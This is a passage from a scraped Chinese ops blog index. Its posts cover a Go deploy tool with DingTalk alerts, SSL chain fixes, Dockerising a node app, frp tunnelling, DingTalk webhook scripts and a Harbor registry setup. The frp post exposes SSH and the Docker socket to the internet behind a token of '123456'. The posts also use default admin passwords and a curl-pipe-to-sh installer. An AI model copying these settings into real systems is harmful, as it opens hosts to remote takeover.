WeiMo = \u0026quot;177*****702\u0026quot; CardMo = \u0026quot;137*****987\u0026quot; Adcom = \u0026quot;158*****925\u0026quot; ) func Exec(cmdStr, Type string) error { fmt.Println(cmdStr) // yj-admall.yml ==\u0026gt; yj-admall args := strings.Split(Config, \u0026quot;.\u0026quot;)[0] //fmt.Printf(\u0026quot;%s,%s\u0026quot;, args, Config) cmd := exec.Command(\u0026quot;sh\u0026quot;, \u0026quot;-c\u0026quot;, cmdStr) stdout, err := cmd.StdoutPipe() if err != nil { return err } if err = cmd.Start(); err != nil { return err } // 读取每行输出 for { tmp := make([]byte, 1024) _, err := stdout.Read(tmp) fmt.Print(string(tmp)) if err != nil { break } } if err = cmd.Wait(); err != nil { return err } var t play.Text //t.Title = fmt.Sprintf(\u0026quot;%s-%s\u0026quot;, args, Tag) t.Text = fmt.Sprintf(\u0026quot;%s:%s %s成功, 请测试确认\\n%s\u0026quot;, args, Tag, Type, Comments) if Type == \u0026quot;rollback\u0026quot; { t.AtMobiles = AllMo } else { switch args { case \u0026quot;api\u0026quot;, \u0026quot;yj-mall\u0026quot;, \u0026quot;yj-h5\u0026quot;, \u0026quot;plmall\u0026quot;, \u0026quot;yj-admall\u0026quot;: t.AtMobiles = WeiMo case \u0026quot;adcom\u0026quot;, \u0026quot;www-ypl\u0026quot;: t.AtMobiles = Adcom case \u0026quot;card\u0026quot;: t.AtMobiles = CardMo default: t.AtMobiles = AllMo } } err = t.Dingding(DingDingUrl) if err != nil { return err } return WriteToLog(Type) } func WriteToLog(Type string) error { filename := \u0026quot;fabu.log\u0026quot; args := strings.Split(Config, \u0026quot;.\u0026quot;)[0] date := time.Now().Format(\u0026quot;2006-01-02 15:04:05\u0026quot;) data := fmt.Sprintf(\u0026quot;[INFO] %s %s-%s %s成功\u0026quot;, date, args, Tag, Type) var ( f *os.File err error ) if !IsFile(filename) { // 文件不存在, 则创建 f, err = os.Create(filename) } else { // 文件存在, 则append. f, err = os.OpenFile(filename, os.O_APPEND|os.O_WRONLY, 0644) } if err != nil { return err } _, err = fmt.Fprintln(f, data) defer f.Close() return err } func IsFile(filePath string) bool { f, e := os.Stat(filePath) if e != nil { return false } return !f.IsDir() } 钉钉调用\n/* * Copyright (c) 2019. The ango Authors. All rights reserved. * Use of this source code is governed by a MIT-style * license that can be found in the LICENSE file. */ package play import ( \u0026quot;fmt\u0026quot; \u0026quot;io/ioutil\u0026quot; \u0026quot;net/http\u0026quot; \u0026quot;strings\u0026quot; ) const ( TextTemplate = `{ \u0026quot;msgtype\u0026quot;: \u0026quot;text\u0026quot;, \u0026quot;text\u0026quot;: { \u0026quot;content\u0026quot;: \u0026quot;%s\u0026quot; }, \u0026quot;at\u0026quot;: { \u0026quot;atMobiles\u0026quot;: [ \u0026quot;%s\u0026quot; ], \u0026quot;isAtAll\u0026quot;: false } }` LinkTemplate = `{ \u0026quot;msgtype\u0026quot;: \u0026quot;link\u0026quot;, \u0026quot;link\u0026quot;: { \u0026quot;text\u0026quot;: \u0026quot;%s\u0026quot;, \u0026quot;title\u0026quot;: \u0026quot;%s\u0026quot;, \u0026quot;picUrl\u0026quot;: \u0026quot;http://icons.iconarchive.com/icons/paomedia/small-n-flat/1024/sign-check-icon.png\u0026quot;, //jenkins 发布的对勾 \u0026quot;messageUrl\u0026quot;: \u0026quot;%s\u0026quot; } }` MarkTemplate = `{ \u0026quot;msgtype\u0026quot;: \u0026quot;markdown\u0026quot;, \u0026quot;markdown\u0026quot;: { \u0026quot;title\u0026quot;:\u0026quot;%s\u0026quot;, \u0026quot;text\u0026quot;: \u0026quot;%s\u0026quot; }, \u0026quot;at\u0026quot;: { \u0026quot;atMobiles\u0026quot;: [ \u0026quot;%s\u0026quot; ], \u0026quot;isAtAll\u0026quot;: false } }` ) // 可以自己去实现方法 type Alarm interface { Post(Dingdingurl string) error } type MarkDowning struct { Title string `json:\u0026quot;title\u0026quot;` Text string `json:\u0026quot;text\u0026quot;` AtMobiles string `json:\u0026quot;atMobiles\u0026quot;` //应该是[]string,图方便,改成这个 } type Linking struct { Text string `json:\u0026quot;text\u0026quot;` Title string `json:\u0026quot;title\u0026quot;` PicUrl string `json:\u0026quot;picUrl\u0026quot;` MessageUrl string `json:\u0026quot;messageUrl\u0026quot;` } type Text struct { MarkDowning // 公用一下, 只是没有title. } func (m Text) Dingding(DingDingUrl string) error { baseBody := fmt.Sprintf(TextTemplate, m.Text, m.AtMobiles) return Post(DingDingUrl,baseBody) } func (m MarkDowning) Dingding(DingDingUrl string) error { baseBody := fmt.Sprintf(MarkTemplate, m.Title, m.Text, m.AtMobiles) return Post(DingDingUrl,baseBody) } func (m Linking) Dingding(DingDingUrl string) error { baseBody := fmt.Sprintf(LinkTemplate, m.Title, m.Text, m.MessageUrl) return Post(DingDingUrl,baseBody) } func Post(DingDingUrl,baseBody string) error { req, err := http.NewRequest(\u0026quot;POST\u0026quot;, DingDingUrl, strings.NewReader(baseBody)) if err != nil { return err } client := \u0026amp;http.Client{} req.Header.Set(\u0026quot;Content-Type\u0026quot;, \u0026quot;application/json\u0026quot;) req.Header.Set(\u0026quot;User-agent\u0026quot;, \u0026quot;firefox\u0026quot;) resp, err := client.Do(req) defer resp.Body.Close() fmt.Println(resp.StatusCode) body, _ := ioutil.ReadAll(resp.Body) // 调试的时候打开, 因为钉钉返回的比如: 缺少json参数等等.. fmt.Println(string(body)) return err } thanks to jetbrains\n","permalink":"https://www.fenghong.tech/blog/ops/ango-with-ansible/","tags":["ops","ansible","golang","cobra"],"title":"A cli tool to deploy ansible-playbook"},{"categories":["ops"],"contents":"[TOC]\n 启用SSL已经有段时间了 , 微信小程序开发过程中发现接口访问报 request fail 错误，各个厂商的ssl检查也没有问题。\n 中间证书 先认识一下中间证书\n 中间证书，其实也叫中间CA（中间证书颁发机构，Intermediate certificate authority, Intermedia CA），对应的是根证书颁发机构（Root certificate authority ，Root CA）。为了验证证书是否可信，必须确保证书的颁发机构在设备的可信 CA 中。SSL的验证机制是由一级一级追溯验证，当前CA不可信则向上层CA验证，直到发现可信或没有可信CA为止，注意有时候Intermedia CA也有可能在设备的可信CA中，这样不用一直追溯到Root CA，即可认证完成。\n根证书，必然是一个自签名的证书，“使用者”和“颁发者”都是相同的，所以不会进一步向下检查，如果根 CA 不是可信 CA ，则将不允许建立可信连接，并提示错误。\n一般Root CA是要求离线保存的，如果要签发证书也是通过人工方式签发，这样能最大程序保证Root CA的安全，而Intermedia CA则相对宽松，允许在线签发证书的，这样方便高效，安全性灵活，即便通过Root CA签发的Intermedia CA发生意外泄露，也可以通过Root CA进行撤销\n 客户端自动完成中间证书下载 一般情况下系统可以通过URL自行完成中间证书的下载，如Windows、iOS、OSX（macOS Sierra）都支持这种方式，但Android和Java客户端不支持自行下载，还有一种情况就是无法访问根证书地址的情况如内网 .\n服务器推送中间证书 除了通过证书中URL下载中间证书外，还可以通过服务器向客户端主动推送中间证书，这样即可兼容系统或客户端不支持自动下载中间证书的情况 。\n至此微信小程序接口报错的问题原因即暴露出来了，是系统或客户端不支持自动下载中间证书，其实在大家完成证书部署之后应该检测一下这样更保险证书检测\nfullchain证书生成 $ echo -n \\ \t| openssl s_client -host fenghong.tech -port 443 -showcerts 2\u0026gt;/dev/null \\ \t| sed -ne \u0026#39;/-BEGIN CERTIFICATE-/,/-END CERTIFICATE-/p\u0026#39; \\ \t\u0026gt; fenghong.tech.fullchain.pem 说明：\necho -n gives a response to the server, so that the connection is released -showcerts 显示所有的证书链 -host 域名 -port 端口 2\u0026gt;/dev/null 不显示错误信息 sed -ne '/-BEGIN CERTIFICATE-/,/-END CERTIFICATE-/p' 只显示证书信息 利用fullchain.pem证书生成.pfx\n$ openssl pkcs12 -export -out fenghong.tech.pfx \\ \t-inkey fenghong.tech.key -in fenghong.tech.fullchain.pem \\ \t-certfile fenghong.tech.fullchain.pem ## 要输入密码确认, 证书和key合成在一起了. 所以需要密码保护. 至此, 合成的pfx支持server发送中间证书, 而不用客户端自行下载了.如果使用nginx作为ssl的web服务器, 可以直接使用pem和key证书. 不需要合成pfx证书.\n参考  how to download ssl certificate from a website  ","permalink":"https://www.fenghong.tech/blog/ops/ssl-certs/","tags":["linux","ssl"],"title":"中间证书缺少导致request fail"},{"categories":["docker"],"contents":"node项目docker化  docker是一个开源的应用容器引擎，可以为我们提供安全、可移植、可重复的自动化部署的方式。docker采用虚拟化的技术来虚拟化出应用程序的运行环境。如上图一样。docker就像一艘轮船。而轮船上面的每个小箱子可以看成我们需要部署的一个个应用。使用docker可以充分利用服务器的系统资源，简化了自动化部署和运维的繁琐流程,减少很多因为开发环境中和生产环境中的不同引发的异常问题。从而提高生产力。\n 首先, 创建一个node项目, 公司的项目由pm2管理, 故此篇文章主要记录如何以pm2为基础镜像管理公司项目.\n$ tree -L 1 . ├── assets ├── ava.config.js ├── components ├── Dockerfile ##Dockerfile ├── docs ├── gulpfile.js ├── hudong-web-msite.zip ├── layouts ├── middleware ├── nuxt.config.js ├── package.json ├── pages ├── plugins ├── README.md ├── server ├── start.config.js ## 入口配置文件 ├── static ├── store └── test 创建pm2基础镜像 node我们选择的版本是ENV NODE_VERSION=10.17.0, 选用的alpine镜像\nFROM node:10-alpine MAINTAINER louis \u0026lt;louis@wangke.co\u0026gt; RUN npm install pm2 -g --registry=https://registry.npm.taobao.org 创建基础镜像\n$ docker build -t louisehong/pm2-alpine . docker化pm2项目 平时我们部署项目的时候, 工程启动时加入一些参数，可以修改某些配置，增加部署的灵活性。 比较常见的有env test/dev/prev/prod等环境配置.\n如\n$ pm2 start start.config.js --env prod $ pm2 start start.config.js --env prev $ pm2 start start.config.js --env dev # 默认为dev环境 表示node启动的配置文件时prod/prev/dev环境配置文件\n# 定义环境变量，会被后续的RUN命令使用，并且在容器运行期间保持 # 配置文件参数，默认为prev环境 FROM louisehong/pm2-alpine MAINTAINER louis \u0026lt;louis@wangke.co\u0026gt; WORKDIR /app COPY . . ENV NPM_CONFIG_LOGLEVEL warn ENV PHASE=\u0026quot;prev\u0026quot; RUN npm install --registry=https://registry.npm.taobao.org \u0026amp;\u0026amp; \\ npm run build EXPOSE 22802 ENTRYPOINT [\u0026quot;sh\u0026quot;,\u0026quot;-c\u0026quot;, \u0026quot;pm2-docker start start.config.js --env $PHASE\u0026quot;] 创建项目后, 在docker启动的时候, 输入环境变量即可\n$ docker build -t louiswz:laster . $ docker run -d -p 22802:22802 \\  --name louiswz -e PHASE=\u0026#34;prod\u0026#34; louisehong/louiswz 踩坑区 使用CMD命令的时候, 传入环境变量不生效.\nCMD [\u0026quot;pm2-docker\u0026quot;, \u0026quot;start\u0026quot;, \u0026quot;start.config.json\u0026quot;,\u0026quot;--env\u0026quot;,\u0026quot;$PHASE\u0026quot;] ","permalink":"https://www.fenghong.tech/blog/docker/node-with-docker/","tags":["docker","go"],"title":"node项目docker化"},{"categories":["ops"],"contents":"对于没有公网 IP 的内网用户来说，远程管理或在外网访问\u0008内网机器上的服务是一个问题。通常解决方案就是用内网穿透工具将内网的服务穿透到公网中，便于远程管理和在外部访问。内网穿透的工具很多, 比如 Ngrok.\n推荐一款好用到炸裂的内网穿透的工具frp, 全名: Fast Reverse Proxy. frp 是一个可用于内网穿透的高性能的反向代理应用，支持 tcp, udp 协议，为 http 和https应用协议提供了额外的能力，且尝试性支持了点对点穿透。\nFRP作用  利用处于内网或防火墙后的机器，对外网环境提供 HTTP 或 HTTPS 服务。 对于 HTTP, HTTPS 服务支持基于域名的虚拟主机，支持自定义域名绑定，使多个域名可以共用一个 80 端口。 利用处于内网或防火墙后的机器，对外网环境提供 TCP 和 UDP 服务，例如在家里通过 SSH 访问处于公司内网环境内的主机。  FRP架构 安装 FRP 采用 Go 语言开发，支持 Windows、Linux、MacOS、ARM等多平台部署\n$ wget https://github.com/fatedier/frp/releases/download/v0.30.0/frp_0.30.0_linux_amd64.tar.gz $ tar xf frp_0.30.0_linux_amd64.tar.gz $ mv frp_0.30.0_linux_amd64 frp $ cd frp/ $ ls frpc frpc_full.ini frpc.ini frps frps_full.ini frps.ini LICENSE systemd 配置ssh访问公司内网机器 身份验证 服务端和客户端的 common 配置中的 token 参数一致则身份验证通过。\n具有公网ip的frps服务器服务端启动frps服务:\n$ vim frps.ini [common] bind_addr = 0.0.0.0 bind_port = 7200 token = 123456 $ ./frps -c ./frps.ini 公司内网机器frpc客户端启动frpc. 假设frps的公网ip为8.12.3.4:\n$ vim frpc.ini [common] server_addr = 8.12.3.4 server_port = 7200 token = 123456 [ssh] type = tcp local_ip = 127.0.0.1 local_port = 22 remote_port = 6000 $ ./frpc -c ./frpc.ini 在家里的user连接公司b机器内网的ssh服务:\n$ ssh -oPort=6000 root@8.12.3.4 通过自定义域名访问公司内网的web服务 具有公网ip的frps服务器, 修改配置文件并启动frps服务:\n$ vim frps.ini [common] server_addr = 8.12.3.4 server_port = 7200 token = 123456 vhost_http_port = 80 vhost_https_port = 443 $ ./frps -c ./frps.ini 公司内网机器frpc客户端启动frpc. 假设frps的公网ip为8.12.3.4:\n$ vim frpc.ini [common] server_addr = 8.12.3.4 server_port = 7200 token = 123456 [httpstest] type = https local_ip = 192.168.0.65 local_port = 88 remote_port = 443 use_encryption = false use_compression = true custom_domains = https.fenghong.tech [httptest] type = https local_ip = 192.168.0.34 local_port = 81 remote_port = 80 use_encryption = false use_compression = true custom_domains = http.fenghong.tech [ssh] type = tcp local_ip = 127.0.0.1 local_port = 22 remote_port = 6000 $ ./frpc -c ./frpc.ini 配置域名解析, https配置可以是nginx来进行web站点配置. 本地的local_ip可以是frpc客户端内网任意可达的ip地址.\nhttp.fenghong.tech A 8.12.3.4 https.fenghong.tech A 8.12.3.4 通过浏览器访问https.fenghong.tech和http.fenghong.tech, 即可访问处于内网的web服务器.\n转发 Unix 域套接字 通过 tcp 端口访问内网的 unix域套接字(例如和 docker daemon 通信)。\nfrps 的部署步骤同上。\n启动 frpc，启用 unix_domain_socket 插件，配置如下：\n# frpc.ini [common] server_addr = 8.12.3.4 server_port = 7000 [unix_domain_socket] type = tcp remote_port = 6000 plugin = unix_domain_socket plugin_unix_path = /var/run/docker.sock 通过 curl 命令查看 docker 版本信息\ncurl http://8.12.3.4:6000/version 安全地暴露内网服务 对于某些服务来说如果直接暴露于公网上将会存在安全隐患。\n使用 stcp(secret tcp) 类型的代理可以避免让任何人都能访问到要穿透的服务，但是访问者也需要运行另外一个 frpc。\n服务端frps部署同上\n公司内网机器frpc客户端启动frpc. 假设frps的公网ip为8.12.3.4:\n$ vim frpc.ini [common] server_addr = 8.12.3.4 server_port = 7200 [secret_ssh] type = stcp # 只有 sk 一致的用户才能访问到此服务 sk = abcdefg local_ip = 127.0.0.1 local_port = 22 在家里的电脑上开启frpc客户端, 配置如下:\n$ vim frpc.ini [common] server_addr = 8.12.3.4 server_port = 7000 [secret_ssh_visitor] type = stcp # stcp 的访问者 role = visitor # 要访问的 stcp 代理的名字 server_name = secret_ssh sk = abcdefg # 绑定本地端口用于访问 ssh 服务 bind_addr = 127.0.0.1 bind_port = 6000 $ ./frpc -c frpc.ini 通过ssh访问处于公司内网机器,\n$ ssh -oPort=6000 root@127.0.0.1 开启Dashboard 通过浏览器查看frp的状态及代理统计信息\n注：Dashboard 尚未针对大量的 proxy 数据展示做优化，如果出现 Dashboard 访问较慢的情况，请不要启用此功能。\n需要在 frps.ini 中指定 dashboard 服务使用的端口，即可开启此功能：\n$ vim frps.ini [common] dashboard_port = 7500 # dashboard 用户名密码，默认都为 admin dashboard_user = admin dashboard_pwd = admin TLS 从 v0.25.0 版本开始 frpc 和 frps 之间支持通过 TLS 协议加密传输。通过在 frpc.ini 的 common 中配置 tls_enable = true 来启用此功能，安全性更高。\n为了端口复用，frp 建立 TLS 连接的第一个字节为 0x17。\n注意: 启用此功能后除 xtcp 外，不需要再设置 use_encryption。\n端口复用 目前 frps 中的 vhost_http_port 和 vhost_https_port 支持配置成和 bind_port 为同一个端口，frps 会对连接的协议进行分析，之后进行不同的处理。\n例如在某些限制较严格的网络环境中，可以将 bind_port 和 vhost_https_port 都设置为 443。\n后续会尝试允许多个 proxy 绑定同一个远端端口的不同协议。\nTCP 多路复用 从 v0.10.0 版本开始，客户端和服务器端之间的连接支持多路复用，不再需要为每一个用户请求创建一个连接，使连接建立的延迟降低，并且避免了大量文件描述符的占用，使 frp 可以承载更高的并发数。\n该功能默认启用，如需关闭，可以在 frps.ini 和 frpc.ini 中配置，该配置项在服务端和客户端必须一致：\n# frps.ini 和 frpc.ini 中 [common] tcp_mux = false 连接池 默认情况下，当用户请求建立连接后，frps 才会请求 frpc 主动与后端服务建立一个连接。当为指定的代理启用连接池后，frp 会预先和后端服务建立起指定数量的连接，每次接收到用户请求后，会从连接池中取出一个连接和用户连接关联起来，避免了等待与后端服务建立连接以及 frpc 和 frps 之间传递控制信息的时间。\n这一功能比较适合有大量短连接请求时开启。\n首先可以在 frps.ini 中设置每个代理可以创建的连接池上限，避免大量资源占用，客户端设置超过此配置后会被调整到当前值：\n$ vim frps.ini [common] max_pool_count = 5 在 frpc.ini 中为客户端启用连接池，指定预创建连接的数量：\n$ vim frpc.ini [common] pool_count = 1 负载均衡 可以将多个相同类型的 proxy 加入到同一个 group 中，从而实现负载均衡的功能。\n目前只支持 TCP 和 HTTP 类型的 proxy。\n# frpc.ini [test1] type = tcp local_port = 8080 remote_port = 80 group = web group_key = 123 [test2] type = tcp local_port = 8081 remote_port = 80 group = web group_key = 123 用户连接 frps 服务器的 80 端口，frps 会将接收到的用户连接随机分发给其中一个存活的 proxy。这样可以在一台 frpc 机器挂掉后仍然有其他节点能够提供服务。\nTCP 类型代理要求 group_key 相同，做权限验证，且 remote_port 相同。\nHTTP 类型代理要求 group_key, custom_domains 或 subdomain 和 locations 相同。\n","permalink":"https://www.fenghong.tech/blog/ops/frp-20191204/","tags":["frp","golang","http"],"title":"内网穿透神级工具frp"},{"categories":["ops","jenkins"],"contents":"使用自定义机器人注意事项   **获取到Webhook地址后，用户可以向这个地址发起HTTP POST 请求，即可实现给该钉钉群发送消息。注意，发起POST请求时，必须将字符集编码设置成UTF-8。\n  当前自定义机器人支持文本 (text)、链接 (link)、markdown、ActionCard、FeedCard消息类型，大家可以根据自己的使用场景选择合适的消息类型，达到最好的展示样式。\n  **自定义机器人发送消息时，可以通过手机号码指定“被@人列表”。在“被@人列表”里面的人员收到该消息时，会有@消息提醒(免打扰会话仍然通知提醒，首屏出现“有人@你”)。\n  当前机器人尚不支持应答机制 (该机制指的是群里成员在聊天@机器人的时候，钉钉回调指定的服务地址，即Outgoing机器人)。\n  每个机器人每分钟最多发送20条。消息发送太频繁会严重影响群成员的使用体验，大量发消息的场景 (譬如系统监控报警) 可以将这些信息进行整合，通过markdown消息以摘要的形式发送到群里。\n  安全设置 安全设置目前有3种方式：\n（1）方式一，自定义关键词\n最多可以设置10个关键词，消息中至少包含其中1个关键词才可以发送成功。\n例如：添加了一个自定义关键词：监控报警\n则这个机器人所发送的消息，必须包含 监控报警 这个词，才能发送成功。\n（2）方式二，加签\n第一步，把timestamp+\u0026rdquo;\\n\u0026quot;+密钥当做签名字符串，使用HmacSHA256算法计算签名，然后进行Base64 encode，最后再把签名参数再进行urlEncode，得到最终的签名（需要使用UTF-8字符集）。\n这里主要演示加签方法.\n加签shell脚本发送版本 shell脚本发送钉钉通知, 这是调用了阿里云api和python脚本, 实现自动发送阿里云可用余额给运维群.\n#!/usr/bin/env bash  ## author: louis@wangke.co function notify(){ curl \u0026#34;https://oapi.dingtalk.com/robot/send?access_token=$dingdingtoken\u0026amp;timestamp=$timestamp\u0026amp;sign=$sign\u0026#34; -H \u0026#39;Content-Type: application/json\u0026#39; -d \u0026#34;{\u0026#39;msgtype\u0026#39;: \u0026#39;markdown\u0026#39;, \u0026#39;markdown\u0026#39;: { \u0026#39;title\u0026#39;: \u0026#39;阿里云费用余额\u0026#39;, \u0026#39;text\u0026#39;: \u0026#39;## 阿里云账户 \\n### 可用现金余额: $AvaliableCash\\n### 可用余额: $AvaliableMount\\n### 查询时间: $DateStamp\u0026#39; } }\u0026#34; } dingdingtoken=xxxxxxxx getkey=$(python a.py) timestamp=${getkey:0:13} sign=$(echo \u0026#34;${getkey:13:100}\u0026#34; | tr -d \u0026#39;\\n\u0026#39;) DateStamp=$(date -d @${getkey:0:10} \u0026#34;+%F %H:%m:%S\u0026#34;) AvaliableCash=$(aliyun bssopenapi QueryAccountBalance | jq .Data.AvailableCashAmount) AvaliableMount=$(aliyun bssopenapi QueryAccountBalance | jq .Data.AvailableAmount) notify 使用python获取时间戳及加密sign\n#python 2.6 import time import hmac import hashlib import base64 import urllib timestamp = long(round(time.time() * 1000)) secret = \u0026#39;secret\u0026#39; secret_enc = bytes(secret).encode(\u0026#39;utf-8\u0026#39;) string_to_sign = \u0026#39;{0}\\n{1}\u0026#39;.format(timestamp, secret) string_to_sign_enc = bytes(string_to_sign).encode(\u0026#39;utf-8\u0026#39;) hmac_code = hmac.new(secret_enc, string_to_sign_enc, digestmod=hashlib.sha256).digest() sign = urllib.quote_plus(base64.b64encode(hmac_code)) print(timestamp) print(sign) \u0026#34;\u0026#34;\u0026#34; #python 2.7 import time import hmac import hashlib import base64 import urllib timestamp = long(round(time.time() * 1000)) secret = \u0026#39;secret\u0026#39; secret_enc = bytes(secret).encode(\u0026#39;utf-8\u0026#39;) string_to_sign = \u0026#39;{}\\n{}\u0026#39;.format(timestamp, secret) string_to_sign_enc = bytes(string_to_sign).encode(\u0026#39;utf-8\u0026#39;) hmac_code = hmac.new(secret_enc, string_to_sign_enc, digestmod=hashlib.sha256).digest() sign = urllib.quote_plus(base64.b64encode(hmac_code)) print(timestamp) print(sign) \u0026#34;\u0026#34;\u0026#34; 脚本执行\n$ sh notify_aliyun_bss.sh {\u0026#34;errcode\u0026#34;:0,\u0026#34;errmsg\u0026#34;:\u0026#34;ok\u0026#34;} 最后, 提一下不需要使用加签的方法, 很早之前写过jenkins发送脚本.\n#!/bin/sh title=$1 messageUrl=$2 picUrl=$4 text=$3 PHONE=\u0026#34;158215*****\u0026#34; TOKEN=$5 DING=\u0026#34;curl -H \\\u0026#34;Content-Type: application/json\\\u0026#34; -X POST --data \u0026#39;{\\\u0026#34;msgtype\\\u0026#34;: \\\u0026#34;link\\\u0026#34;, \\\u0026#34;link\\\u0026#34;: {\\\u0026#34;messageUrl\\\u0026#34;: \\\u0026#34;${messageUrl}\\\u0026#34;, \\\u0026#34;title\\\u0026#34;: \\\u0026#34;${title}\\\u0026#34;, \\\u0026#34;picUrl\\\u0026#34;: \\\u0026#34;${picUrl}\\\u0026#34;, \\\u0026#34;text\\\u0026#34;: \\\u0026#34;${text}\\\u0026#34;,}, \\\u0026#34;at\\\u0026#34;: {\\\u0026#34;atMobiles\\\u0026#34;: [${PHONE}], \\\u0026#34;isAtAll\\\u0026#34;: false}}\u0026#39; ${TOKEN}\u0026#34; eval $DING 脚本执行\n$ sh /var/jenkins_home/dingding.sh jenkins-test-qx-44 \\ http://fenghong.tech:8088/job/test-qx/44/ 发布成功 \\ http://icons.iconarchive.com/icons/paomedia/small-n-flat/1024/sign-check-icon.png \\ https://oapi.dingtalk.com/robot/send?access_token=**** 错误码 // 消息内容中不包含任何关键词 { \u0026quot;errcode\u0026quot;:310000, \u0026quot;errmsg\u0026quot;:\u0026quot;keywords not in content\u0026quot; } // timestamp 无效 { \u0026quot;errcode\u0026quot;:310000, \u0026quot;errmsg\u0026quot;:\u0026quot;invalid timestamp\u0026quot; } // 签名不匹配 { \u0026quot;errcode\u0026quot;:310000, \u0026quot;errmsg\u0026quot;:\u0026quot;sign not match\u0026quot; } // IP地址不在白名单 { \u0026quot;errcode\u0026quot;:310000, \u0026quot;errmsg\u0026quot;:\u0026quot;ip X.X.X.X not in whitelist\u0026quot; } 参考  钉钉自定义机器人  ","permalink":"https://www.fenghong.tech/blog/ops/shell-use-sign-dingding/","tags":["ops","jenkins","dingding"],"title":"使用shell脚本发送钉钉通知"},{"categories":["docker"],"contents":"[TOC]\n说明  # 开头的行表示注释 \u0026gt; 开头的行表示需要在 mysql 中执行 $ 开头的行表示需要执行的命令  本文档适用于有一定web运维经验的管理员或者工程师，文中不会对安装的软件做过多的解释，仅对需要执行的内容注部分注释，更详细的内容请参考其他安装。\n环境   系统 : CentOS Linux release 7.7.1908 (Core) , 3.10.0-1062.el7.x86_64\n  ip: 192.168.0.65\n  目录: /home/louis\n  依赖: docker, docker-compose\n  项目结构 $ tree -L 2 . ├── certs │ ├── fenghong.tech.cer │ └── fenghong.tech.key ├── data │ ├── ca_download │ ├── database │ ├── job_logs │ ├── psc │ ├── redis │ ├── registry │ └── secret ├── harbor │ ├── common │ ├── docker-compose.yml │ ├── harbor.v1.9.3.tar.gz │ ├── harbor.yml │ ├── install.sh │ ├── LICENSE │ └── prepare └── logs ├── core.log ├── jobservice.log ├── portal.log ├── postgresql.log ├── proxy.log ├── redis.log ├── registryctl.log └── registry.log 部署步骤 # 下载harbor-offline $ su louis $ cd /home/louis/ $ wget https://github.com/goharbor/harbor/releases/download/v1.9.3/harbor-offline-installer-v1.9.3.tgz # 解压 $ tar xf harbor-offline-installer-v1.9.3.tgz # 修改配置文件 $ cd /home/louis/harbor $ cp harbor.yml harbor.yml.bak $ cat \u0026gt; harbor.yml \u0026lt;\u0026lt;eof hostname: harbor.fenghong.tech http: port: 81 https: port: 443 certificate: /home/louis/certs/fenghong.tech.cer private_key: /home/louis/certs/fenghong.tech.key harbor_admin_password: Harbor12345 database: password: root123 max_idle_conns: 50 max_open_conns: 100 data_volume: /home/louis/data clair: updaters_interval: 12 jobservice: max_job_workers: 10 notification: webhook_job_max_retry: 10 chart: absolute_url: disabled log: level: info local: rotate_count: 50 rotate_size: 200M location: /home/louis/logs _version: 1.9.0 proxy: http_proxy: https_proxy: no_proxy: 127.0.0.1,localhost,.local,.internal,log,db,redis,nginx,core,portal,postgresql,jobservice,registry,registryctl,clair components: - core - jobservice - clair eof 配置https证书并启动项目 参考https://blog.fenghong.tech/blog/ops/acme-ssl-cert/\n$ su louis $ curl https://get.acme.sh | sh $ export Ali_Key=\u0026quot;alikey\u0026quot; $ export Ali_Secret=\u0026quot;alikeySecret\u0026quot; $ . .bashrc $ acme.sh --issue --dns dns_ali -d *.fenghong.tech -d fenghong.tech $ cd .acme.sh/\\*.fenghong.tech/ $ acme.sh --install-cert -d *.fenghong.tech --key-file /home/louis/certs/fenghong.tech.key --fullchain-file /home/louis/certs/fenghong.tech.cer 启动项目, 因为普通用户是没有权限的, 需要用到sudo去操作docker-compose, 且将louis用户加入到docker组.\n$ sudo usermod -aG docker louis $ sudo ./install 查看项目\n$ cd /home/louis/harbor \u0026amp;\u0026amp; sudo docker-compose ps Name Command State Ports ----------------------------------------------------------------------------------------------- harbor-core /harbor/harbor_core Up (healthy) harbor-db /docker-entrypoint.sh Up (healthy) 5432/tcp harbor-jobser/harbor/harbor_jobservice ... Up (healthy) harbor-log /bin/sh -c /usr/local/bin/ ... Up (healthy) 127.0.0.1:1514-\u0026gt;10514/tcp harbor-portalnginx -g daemon off; Up (healthy) 8080/tcp nginx nginx -g daemon off; Up (healthy) 0.0.0.0:81-\u0026gt;8080/tcp, 0.0.0.0:443-\u0026gt;8443/tcp redis redis-server /etc/redis.conf Up (healthy) 6379/tcp registry /entrypoint.sh /etc/regist ... Up (healthy) 5000/tcp registryctl /harbor/start.sh Up (healthy) 重启项目\n$ cd /home/louis/harbor \u0026amp;\u0026amp; sudo docker-compose down $ sudo docker-compose up -d 配置DNS解析并开始访问 $ dig harbor.fenghong.tech ; \u0026lt;\u0026lt;\u0026gt;\u0026gt; DiG 9.8.2rc1-RedHat-9.8.2-0.68.rc1.el6_10.1 \u0026lt;\u0026lt;\u0026gt;\u0026gt; harbor.fenghong.tech ;; global options: +cmd ;; Got answer: ;; -\u0026gt;\u0026gt;HEADER\u0026lt;\u0026lt;- opcode: QUERY, status: NOERROR, id: 52482 ;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0 ;; QUESTION SECTION: ;harbor.fenghong.tech.\tIN\tA ;; ANSWER SECTION: harbor.fenghong.tech.\t600\tIN\tA\t192.168.0.65 访问网站harbor\n部署支持helm的chart仓库 $ cd /home/louis/harbor \u0026amp;\u0026amp; sudo docker-compose down -v $ sudo ./install.sh --with-chartmuseum $ sudo docker-compose up -d ","permalink":"https://www.fenghong.tech/blog/docker/harbor-registry/","tags":["docker","harbor"],"title":"搭建https镜像仓库harbor记录"},{"categories":["tools"],"contents":"JetBrains 公司旗下的 IDEA 功能都十分强大，深受各种编程语言相关的程序员的喜爱. 我个人喜欢goland以及pycharm.\n 正常情况下 JetBrains 公司的每个 IDE 分为Ultimate（企业付费版本）和Community（社区免费）两个版本。实际开发中大多数人都是使用、或希望使用 Ultimate 版本，因为它功能全面且完善，由于黑科技盛行，包括我在内的大多数人都是使用的河蟹破解版的 Ultimate 版本。\n 我在某个开源社区了解到 JetBrains 公司为了表达对开源项目的支持。只要你拥有一个符合条件的开源项目，你或者你的团队就可以免费使用 JetBrains 公司旗下所有的 Ultimate 版本的 IDE 开发工具，即全家桶的使用权 1 年，如果到期了还可以继续申请。\n大致的开源项目要求是这个样子的：\n  你必须是项目的发起人或是活跃的commiter\n  你的项目需要积极开发 3 个月以上\n  定期发布版本\n  符合开源的定义，不能包含有关商业性质的内容\n  申请步骤 从官网Open Source License,进行提交申请.\n收到邮件 通过上面的申请地址，我进行了开源许可证的申请，按照所提到的消息，剩下的我只需要等待就 OK 了。我用来申请的开源项目ginuse, 一个使用webhook发送deploy请求的.\n过了大概3天, 收到了一封jetBrains的授权同意邮件. 至此, 